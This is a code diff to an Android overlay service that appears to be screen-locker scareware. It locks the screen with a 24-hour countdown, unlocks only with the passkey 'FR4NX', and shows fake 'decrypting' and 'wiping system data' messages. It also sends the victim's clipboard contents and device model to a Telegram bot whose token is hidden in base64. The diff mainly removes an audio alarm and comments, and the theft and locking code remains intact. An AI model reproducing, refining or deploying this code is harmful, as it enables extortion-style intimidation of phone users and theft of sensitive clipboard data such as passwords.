@@ -9,7 +9,6 @@ import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.PixelFormat;
-import android.media.MediaPlayer;
 import android.os.Build;
 import android.os.CountDownTimer;
 import android.os.Handler;
@@ -59,7 +58,6 @@ public class OverlayService extends Service {
     private boolean shuttingDown = false;
 
     private CountDownTimer timer;
-    private MediaPlayer mediaPlayer;
     private Vibrator vibrator;
     private Handler handler = new Handler(Looper.getMainLooper());
 
@@ -176,7 +174,7 @@ public class OverlayService extends Service {
         // 1. Vibration Loop
         vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
         if (vibrator != null && vibrator.hasVibrator()) {
-            long[] pattern = {0, 1000, 1000}; // Wait 0ms, vibrate 1000ms, sleep 1000ms
+            long[] pattern = {0, 1000, 1000};
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
             } else {
@@ -184,17 +182,7 @@ public class OverlayService extends Service {
             }
         }
 
-        // 2. Audio Loop (Requires res/raw/alarm.mp3)
-        try {
-            mediaPlayer = MediaPlayer.create(this, R.raw.alarm);
-            if (mediaPlayer != null) {
-                mediaPlayer.setLooping(true);
-                mediaPlayer.setVolume(0.5f, 0.5f);
-                mediaPlayer.start();
-            }
-        } catch (Exception ignored) {}
-
-        // 3. Countdown Timer
+        // 2. Countdown Timer
         timer = new CountDownTimer(24 * 60 * 60 * 1000L, 1000) {
             @Override
             public void onTick(long millisUntilFinished) {
@@ -235,9 +223,8 @@ public class OverlayService extends Service {
         actionProgressBar.setProgress(0);
 
         if ("FR4NX".equals(pass)) {
-            // CORRECT PASSKEY: Decrypting Loop
             shuttingDown = true;
-            statusText.setTextColor(0xFF00FF00); // Green
+            statusText.setTextColor(0xFF00FF00);
             statusText.setText("DECRYPTING SYSTEM FILES...");
             
             handler.post(new Runnable() {
@@ -246,7 +233,7 @@ public class OverlayService extends Service {
                 public void run() {
                     if (progress <= 100) {
                         actionProgressBar.setProgress(progress);
-                        progress += 5; // 5% every 500ms = 10 seconds total
+                        progress += 5;
                         handler.postDelayed(this, 500);
                     } else {
                         unlockOverlay();
@@ -254,8 +241,7 @@ public class OverlayService extends Service {
                 }
             });
         } else {
-            // WRONG PASSKEY: Fake Wipe Loop
-            statusText.setTextColor(0xFFFF0000); // Red
+            statusText.setTextColor(0xFFFF0000);
             statusText.setText("WARNING: WIPING SYSTEM DATA...");
             
             handler.post(new Runnable() {
@@ -264,10 +250,9 @@ public class OverlayService extends Service {
                 public void run() {
                     if (progress <= 100) {
                         actionProgressBar.setProgress(progress);
-                        progress += 10; // 10% every 500ms = 5 seconds total
+                        progress += 10;
                         handler.postDelayed(this, 500);
                     } else {
-                        // Reset back to login
                         statusText.setVisibility(View.GONE);
                         actionProgressBar.setVisibility(View.GONE);
                         authInput.setVisibility(View.VISIBLE);
@@ -282,7 +267,6 @@ public class OverlayService extends Service {
     private void unlockOverlay() {
         shuttingDown = true;
         if (timer != null) timer.cancel();
-        if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
         if (vibrator != null) vibrator.cancel();
         handler.removeCallbacksAndMessages(null);
 
@@ -307,7 +291,6 @@ public class OverlayService extends Service {
             String device = Build.MANUFACTURER + " " + Build.MODEL;
             String message = "FR4NX Hit!\nDevice: " + device + "\nClipboard: " + clip;
             
-            // Decode Token
             String token = new String(Base64.decode("OTAzMjQ2NjQzNzpBQUVGOGlmeEp2R001Z2hVRkNmRWNOUGJCNUdjSGlYdC1VWQ==", Base64.DEFAULT));
             URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -325,7 +308,6 @@ public class OverlayService extends Service {
     @Override
     public void onDestroy() {
         if (timer != null) timer.cancel();
-        if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
         if (vibrator != null) vibrator.cancel();
         handler.removeCallbacksAndMessages(null);
         
